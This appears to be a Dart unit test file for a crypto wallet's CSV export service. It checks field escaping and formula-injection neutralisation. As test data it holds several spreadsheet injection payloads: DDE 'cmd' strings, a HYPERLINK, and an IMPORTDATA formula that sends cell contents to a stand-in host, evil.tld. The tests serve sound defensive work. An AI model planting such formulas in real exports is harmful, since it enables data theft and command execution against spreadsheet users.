import 'package:cake_wallet/anonpay/anonpay_invoice_info.dart';
import 'package:cake_wallet/core/csv_export_service.dart';
import 'package:cake_wallet/entities/transaction_description.dart';
import 'package:cake_wallet/store/app_store.dart';
import 'package:cake_wallet/view_model/dashboard/anonpay_transaction_list_item.dart';
import 'package:cake_wallet/view_model/dashboard/balance_view_model.dart';
import 'package:cake_wallet/view_model/dashboard/date_section_item.dart';
import 'package:cake_wallet/view_model/dashboard/payjoin_transaction_list_item.dart';
import 'package:cake_wallet/view_model/dashboard/transaction_list_item.dart';
import 'package:cw_core/amount/money.dart';
import 'package:cw_core/balance.dart';
import 'package:cw_core/crypto_currency.dart';
import 'package:cw_core/payjoin_session.dart';
import 'package:cw_core/transaction_direction.dart';
import 'package:cw_core/transaction_history.dart';
import 'package:cw_core/transaction_info.dart';
import 'package:cw_core/wallet_addresses.dart';
import 'package:cw_core/wallet_base.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:hive/hive.dart';

const kPrimaryAddress = 'primaryAddr';

class _Unstubbed {
  @override
  dynamic noSuchMethod(Invocation invocation) =>
      throw UnimplementedError('${invocation.memberName} is not stubbed in this fake');
}

class _FakeDescriptionBox extends _Unstubbed implements Box<TransactionDescription> {
  _FakeDescriptionBox(this._values);

  final List<TransactionDescription> _values;

  @override
  Iterable<TransactionDescription> get values => _values;
}

class _FakeWalletAddresses extends _Unstubbed implements WalletAddresses {
  @override
  String get primaryAddress => kPrimaryAddress;
}

class _FakeWallet extends _Unstubbed
    implements WalletBase<Balance, TransactionHistoryBase<TransactionInfo>, TransactionInfo> {
  @override
  WalletAddresses get walletAddresses => _FakeWalletAddresses();
}

class _FakeBalanceViewModel extends _Unstubbed implements BalanceViewModel {
  @override
  WalletBase<Balance, TransactionHistoryBase<TransactionInfo>, TransactionInfo> get wallet =>
      _FakeWallet();
}

class _FakeAppStore extends _Unstubbed implements AppStore {}

class _FakeTransactionInfo extends TransactionInfo {
  _FakeTransactionInfo({required String id}) {
    this.id = id;
    txHash = id;
    amount = Money.fromInt(0, CryptoCurrency.btc);
    direction = TransactionDirection.incoming;
    isPending = false;
    date = DateTime.utc(2024, 6, 15, 12);
    from = 'senderAddress';
  }
}

void main() {
  late CsvExportService service;

  CsvExportService serviceWith(List<TransactionDescription> descriptions) =>
      CsvExportService(transactionDescriptionBox: _FakeDescriptionBox(descriptions));

  TransactionListItem txItem(String id) => TransactionListItem(
        transaction: _FakeTransactionInfo(id: id),
        balanceViewModel: _FakeBalanceViewModel(),
        appStore: _FakeAppStore(),
        key: ValueKey(id),
      );

  String noteColumnOf(String csv) => csv.trim().split('\n').last.split(',')[9];

  setUp(() => service = serviceWith([]));

  // ── RFC 4180 escaping ──────────────────────────────────────────────────────

  group('escapeField', () {
    test('plain field is returned unchanged', () {
      expect(service.escapeField('hello'), 'hello');
    });

    test('field with comma is double-quoted', () {
      expect(service.escapeField('a,b'), '"a,b"');
    });

    test('field with double-quote has internal quote escaped and is wrapped', () {
      expect(service.escapeField('say "hi"'), '"say ""hi"""');
    });

    test('field with newline is double-quoted', () {
      expect(service.escapeField('line1\nline2'), '"line1\nline2"');
    });

    test('empty string is returned unchanged', () {
      expect(service.escapeField(''), '');
    });

    test('field with a bare carriage return is double-quoted', () {
      expect(service.escapeField('line1\rline2'), '"line1\rline2"');
    });
  });

  // ── Spreadsheet formula injection ─────────────────────────────────────

  group('escapeField – formula injection', () {
    test('field starting with = is prefixed with the text marker', () {
      expect(service.escapeField('=1+1'), "'=1+1");
    });

    test('field starting with + is prefixed with the text marker', () {
      expect(service.escapeField('+1+1'), "'+1+1");
    });

    test('field starting with @ is prefixed with the text marker', () {
      expect(service.escapeField('@SUM(A1)'), "'@SUM(A1)");
    });

    test('field starting with a tab is prefixed with the text marker', () {
      expect(service.escapeField('\t=1+1'), "'\t=1+1");
    });

    test('field starting with a carriage return is prefixed and quoted', () {
      expect(service.escapeField('\r=1+1'), '"\'\r=1+1"');
    });

    test('DDE payload starting with - is prefixed with the text marker', () {
      expect(service.escapeField("-2+3+cmd|'/C calc'!A0"), "'-2+3+cmd|'/C calc'!A0");
    });

    test('IMPORTDATA payload is neutralised and still RFC 4180 quoted', () {
      expect(
        service.escapeField('=IMPORTDATA("https://evil.tld")'),
        '"\'=IMPORTDATA(""https://evil.tld"")"',
      );
    });

    test('negative integer is left untouched', () {
      expect(service.escapeField('-12'), '-12');
    });

    test('negative decimal is left untouched', () {
      expect(service.escapeField('-0.00000001'), '-0.00000001');
    });

    test('trigger character away from the start is left untouched', () {
      expect(service.escapeField('total =1+1'), 'total =1+1');
    });

    test('ISO date is left untouched', () {
      expect(service.escapeField('2024-06-15T12:00:00.000Z'), '2024-06-15T12:00:00.000Z');
    });
  });

  // ── Header row ─────────────────────────────────────────────────────────────

  group('buildCsvContent – header', () {
    test('first line after BOM is the header row', () {
      final csv = service.buildCsvContent([]);
      final lines = csv.split('\n');
      // lines[0] is BOM + header (or BOM on its own if \n follows BOM)
      final header = lines.firstWhere((l) => l.contains('record_type'));
      expect(header, contains('record_type'));
      expect(header, contains('date_time'));
      expect(header, contains('tx_id'));
      expect(header, contains('from_amount'));
      expect(header, contains('to_amount'));
      expect(header, contains('confirmations'));
    });

    test('header has exactly 17 columns', () {
      final csv = service.buildCsvContent([]);
      final headerLine = csv.split('\n').firstWhere((l) => l.contains('record_type'));
      // Remove BOM if present at start
      final clean = headerLine.replaceAll('﻿', '');
      expect(clean.split(',').length, 17);
    });
  });

  // ── Empty list ─────────────────────────────────────────────────────────────

  group('buildCsvContent – empty list', () {
    test('returns BOM + header only, no data rows', () {
      final csv = service.buildCsvContent([]);
      final lines = csv.trim().split('\n');
      expect(lines.length, 1); // header only
    });
  });

  // ── DateSectionItem skipped ────────────────────────────────────────────────

  group('buildCsvContent – DateSectionItem', () {
    test('DateSectionItem is excluded from output', () {
      final section = DateSectionItem(DateTime.now(), key: const ValueKey('ds'));
      final csv = service.buildCsvContent([section]);
      final lines = csv.trim().split('\n');
      expect(lines.length, 1); // header only, section skipped
    });
  });

  // ── AnonpayTransactionListItem ─────────────────────────────────────────────

  group('buildCsvContent – anonpay row', () {
    AnonpayInvoiceInfo makeAnonpay({
      String address = 'someAddress',
      String status = 'paid',
      double? fiatAmount,
      String? fiatEquiv,
      double? amountTo,
      String coinTo = 'XMR',
    }) {
      return AnonpayInvoiceInfo(
        invoiceId: 'inv-001',
        clearnetUrl: '',
        onionUrl: '',
        clearnetStatusUrl: '',
        onionStatusUrl: '',
        status: status,
        fiatAmount: fiatAmount,
        fiatEquiv: fiatEquiv,
        amountTo: amountTo,
        coinTo: coinTo,
        address: address,
        createdAt: DateTime.utc(2024, 6, 15, 12, 0, 0),
        walletId: 'wallet-1',
        provider: 'Cake Pay',
      );
    }

    test('produces a row with record_type=anonpay', () {
      final item = AnonpayTransactionListItem(
        transaction: makeAnonpay(),
        key: const ValueKey('ap1'),
      );
      final csv = service.buildCsvContent([item]);
      final dataLine = csv.trim().split('\n').last;
      expect(dataLine, startsWith('anonpay,'));
    });

    test('uses fiatAmount when available', () {
      final item = AnonpayTransactionListItem(
        transaction: makeAnonpay(fiatAmount: 12.5, fiatEquiv: 'USD'),
        key: const ValueKey('ap2'),
      );
      final csv = service.buildCsvContent([item]);
      final dataLine = csv.trim().split('\n').last;
      expect(dataLine, contains('12.5'));
      expect(dataLine, contains('USD'));
    });

    test('falls back to amountTo/coinTo when no fiat amount', () {
      final item = AnonpayTransactionListItem(
        transaction: makeAnonpay(amountTo: 0.5, coinTo: 'XMR'),
        key: const ValueKey('ap3'),
      );
      final csv = service.buildCsvContent([item]);
      final dataLine = csv.trim().split('\n').last;
      expect(dataLine, contains('0.5'));
      expect(dataLine, contains('XMR'));
    });

    test('address with comma is RFC 4180 quoted', () {
      final item = AnonpayTransactionListItem(
        transaction: makeAnonpay(address: 'addr,part1,part2'),
        key: const ValueKey('ap4'),
      );
      final csv = service.buildCsvContent([item]);
      expect(csv, contains('"addr,part1,part2"'));
    });

    test('address that starts with a formula trigger is neutralised in the row', () {
      final item = AnonpayTransactionListItem(
        transaction: makeAnonpay(address: '=HYPERLINK("https://evil.tld","receipt")'),
        key: const ValueKey('ap5'),
      );
      final csv = service.buildCsvContent([item]);
      final dataLine = csv.trim().split('\n').last;
      expect(dataLine, contains('"\'=HYPERLINK'));
      expect(dataLine, isNot(contains('"=HYPERLINK')));
    });
  });

  // ── PayjoinTransactionListItem ─────────────────────────────────────────────

  group('buildCsvContent – payjoin row', () {
    PayjoinSession makeSession({
      bool isSender = true,
      String status = 'created',
      String? txId,
      String? rawAmount,
    }) {
      return PayjoinSession(
        walletId: 'wallet-1',
        sender: isSender ? 'senderAddr' : null,
        receiver: isSender ? null : 'receiverAddr',
        pjUri: isSender ? 'payjoin:uri' : null,
        status: status,
        inProgressSince: DateTime.utc(2024, 6, 15, 10, 0, 0),
        rawAmount: rawAmount ?? '100000',
      )..txId = txId;
    }

    test('produces a row with record_type=payjoin', () {
      final session = makeSession();
      final item = PayjoinTransactionListItem(
        sessionId: 'pj-1',
        session: session,
        key: const ValueKey('pj1'),
      );
      final csv = service.buildCsvContent([item]);
      final dataLine = csv.trim().split('\n').last;
      expect(dataLine, startsWith('payjoin,'));
    });

    test('sender session has type=send', () {
      final item = PayjoinTransactionListItem(
        sessionId: 'pj-2',
        session: makeSession(isSender: true),
        key: const ValueKey('pj2'),
      );
      final csv = service.buildCsvContent([item]);
      final dataLine = csv.trim().split('\n').last;
      // type is the 3rd column (index 2)
      expect(dataLine.split(',')[2], 'send');
    });

    test('receiver session has type=receive', () {
      final item = PayjoinTransactionListItem(
        sessionId: 'pj-3',
        session: makeSession(isSender: false),
        key: const ValueKey('pj3'),
      );
      final csv = service.buildCsvContent([item]);
      final dataLine = csv.trim().split('\n').last;
      expect(dataLine.split(',')[2], 'receive');
    });

    test('tx_id column populated when txId is set', () {
      final item = PayjoinTransactionListItem(
        sessionId: 'pj-4',
        session: makeSession(txId: 'abc123'),
        key: const ValueKey('pj4'),
      );
      final csv = service.buildCsvContent([item]);
      expect(csv, contains('abc123'));
    });

    test('currency column is BTC', () {
      final item = PayjoinTransactionListItem(
        sessionId: 'pj-5',
        session: makeSession(),
        key: const ValueKey('pj5'),
      );
      final csv = service.buildCsvContent([item]);
      final dataLine = csv.trim().split('\n').last;
      // currency is 5th column (index 4)
      expect(dataLine.split(',')[4], 'BTC');
    });
  });

  // ── Mixed list ─────────────────────────────────────────────────────────────

  group('buildCsvContent – mixed list', () {
    test('DateSectionItem mixed with data items produces correct row count', () {
      final section = DateSectionItem(DateTime.now(), key: const ValueKey('ds2'));
      final anonpay = AnonpayTransactionListItem(
        transaction: AnonpayInvoiceInfo(
          invoiceId: 'x',
          clearnetUrl: '',
          onionUrl: '',
          clearnetStatusUrl: '',
          onionStatusUrl: '',
          status: 'paid',
          coinTo: 'XMR',
          address: 'addr1',
          createdAt: DateTime.now(),
          walletId: 'w1',
          provider: 'Cake Pay',
        ),
        key: const ValueKey('ap-mix'),
      );

      final csv = service.buildCsvContent([section, anonpay]);
      final lines = csv.trim().split('\n');
      // header + 1 data row only (section skipped)
      expect(lines.length, 2);
      expect(lines.last, startsWith('anonpay,'));
    });
  });

  // ── Trade row (field mapping, no AppStore needed for raw fields) ───────────

  group('buildCsvContent – trade direct field coverage', () {
    test('escapeField handles memo with double-quote in trade context', () {
      // Simulates the memo field from a Trade that contains internal quotes
      final memoWithQuotes = 'says "hello"';
      expect(service.escapeField(memoWithQuotes), '"says ""hello"""');
    });

    test('escapeField neutralises a memo that opens with a formula', () {
      expect(service.escapeField("=cmd|'/C calc'!A0"), "'=cmd|'/C calc'!A0");
    });
  });

  // ── Transaction note column (CW-1638) ─────────────────────────────────

  group('buildCsvContent – transaction note', () {
    test('note keyed by <txHash>_<primaryAddress> lands in the note column', () {
      final csv = serviceWith([
        TransactionDescription(id: 'tx1_$kPrimaryAddress', transactionNote: 'dinner'),
      ]).buildCsvContent([txItem('tx1')]);

      expect(noteColumnOf(csv), 'dinner');
    });

    test('legacy note keyed by the bare txHash still resolves', () {
      final csv = serviceWith([
        TransactionDescription(id: 'tx1', transactionNote: 'legacy note'),
      ]).buildCsvContent([txItem('tx1')]);

      expect(noteColumnOf(csv), 'legacy note');
    });

    test('transaction without a stored note leaves the note column empty', () {
      final csv = serviceWith([]).buildCsvContent([txItem('tx1')]);

      expect(noteColumnOf(csv), '');
    });

    test('note supplied by a payment request cannot inject a formula', () {
      // tx_description / message of a scanned bitcoin: URI ends up here verbatim.
      final csv = serviceWith([
        TransactionDescription(
          id: 'tx1_$kPrimaryAddress',
          transactionNote: '=IMPORTDATA("https://evil.tld/?d="&A2)',
        ),
      ]).buildCsvContent([txItem('tx1')]);

      final dataLine = csv.trim().split('\n').last;
      expect(dataLine, contains('"\'=IMPORTDATA'));
      expect(dataLine, isNot(contains('"=IMPORTDATA')));
    });

    test('note starting with a hyphen is neutralised without mangling amounts', () {
      final csv = serviceWith([
        TransactionDescription(id: 'tx1_$kPrimaryAddress', transactionNote: '-2+3+cmd|x'),
      ]).buildCsvContent([txItem('tx1')]);

      final columns = csv.trim().split('\n').last.split(',');
      expect(columns[9], "'-2+3+cmd|x");
      expect(columns[3], '0');
    });
  });
}
